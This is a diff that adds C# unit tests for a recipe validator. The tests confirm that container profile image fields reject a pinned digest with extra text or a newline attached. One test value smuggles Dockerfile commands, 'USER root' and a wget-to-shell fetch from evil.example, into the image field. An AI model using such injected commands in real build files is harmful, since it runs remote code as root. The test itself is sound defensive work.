@@ -749,6 +749,83 @@ namespace NodeKit.Tests.Recipes
             Assert.True(result.IsValid);
         }
 
+        // 외부 리뷰 발견(High): 예전엔 profileImage.Contains("@sha256:")만 검사해서
+        // "@sha256:<진짜 digest>" 뒤에 개행 + 임의 Dockerfile 명령을 붙인 값이
+        // 그대로 통과했다 — RecipeRenderer.RenderSourceBuildStructured가 이
+        // 값을 그대로 "FROM " + profileImage에 이어 붙이므로, 검증을 통과하면
+        // 렌더링된 Dockerfile에 임의 명령(RUN, USER 등)이 그대로 주입됐다.
+        // BuildProfileImage/RuntimeProfileImage 둘 다 같은 ValidateProfileSelection을
+        // 타므로 두 필드 모두 재현한다.
+        [Theory]
+        [InlineData("BuildProfileImage")]
+        [InlineData("RuntimeProfileImage")]
+        public void Validate_SourceBuildStructured_AdvancedProfileImageWithNewlineInjection_Fails(string field)
+        {
+            var maliciousImage =
+                "docker.io/library/debian:bookworm-slim@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" +
+                "\nUSER root\nRUN wget http://evil.example/x.sh -O- | sh";
+            var recipe = new RecipeDocument
+            {
+                BuildKind = RecipeKind.SourceBuildStructured,
+                BuildProfile = field == "BuildProfileImage" ? "advanced" : "generic",
+                BuildProfileImage = field == "BuildProfileImage" ? maliciousImage : string.Empty,
+                RuntimeProfile = field == "RuntimeProfileImage" ? "advanced" : "minimal",
+                RuntimeProfileImage = field == "RuntimeProfileImage" ? maliciousImage : string.Empty,
+                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
+                SourceChecksum = ValidChecksum,
+                SourceBuildCommands = { "make" },
+            };
+
+            var result = RecipeValidator.Validate(recipe);
+
+            Assert.False(result.IsValid);
+            var expectedRuleId = field == "BuildProfileImage" ? "L1-RCP-017" : "L1-RCP-018";
+            Assert.Contains(result.Violations, v => v.RuleId == expectedRuleId && v.Field == field);
+        }
+
+        [Fact]
+        public void Validate_SourceBuildStructured_AdvancedProfileImageWithTruncatedDigestPlusTrailingChar_Fails()
+        {
+            // Same root cause as the newline-injection case, minimal repro:
+            // one extra character after an otherwise-valid 64-hex digest must
+            // still be rejected -- confirms the check is \z-anchored (exact
+            // length), not just "contains 64+ hex chars somewhere".
+            var recipe = new RecipeDocument
+            {
+                BuildKind = RecipeKind.SourceBuildStructured,
+                BuildProfile = "generic",
+                RuntimeProfile = "advanced",
+                RuntimeProfileImage = PinnedBaseImage + "x",
+                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
+                SourceChecksum = ValidChecksum,
+                SourceBuildCommands = { "make" },
+            };
+
+            var result = RecipeValidator.Validate(recipe);
+
+            Assert.False(result.IsValid);
+            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-018" && v.Field == "RuntimeProfileImage");
+        }
+
+        [Fact]
+        public void Validate_SourceBuildStructured_AdvancedRuntimeProfileWithPinnedImage_Passes()
+        {
+            var recipe = new RecipeDocument
+            {
+                BuildKind = RecipeKind.SourceBuildStructured,
+                BuildProfile = "generic",
+                RuntimeProfile = "advanced",
+                RuntimeProfileImage = PinnedBaseImage,
+                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
+                SourceChecksum = ValidChecksum,
+                SourceBuildCommands = { "make" },
+            };
+
+            var result = RecipeValidator.Validate(recipe);
+
+            Assert.True(result.IsValid);
+        }
+
         [Fact]
         public void Validate_SourceBuildStructured_MissingRuntimeProfile_Fails()
         {
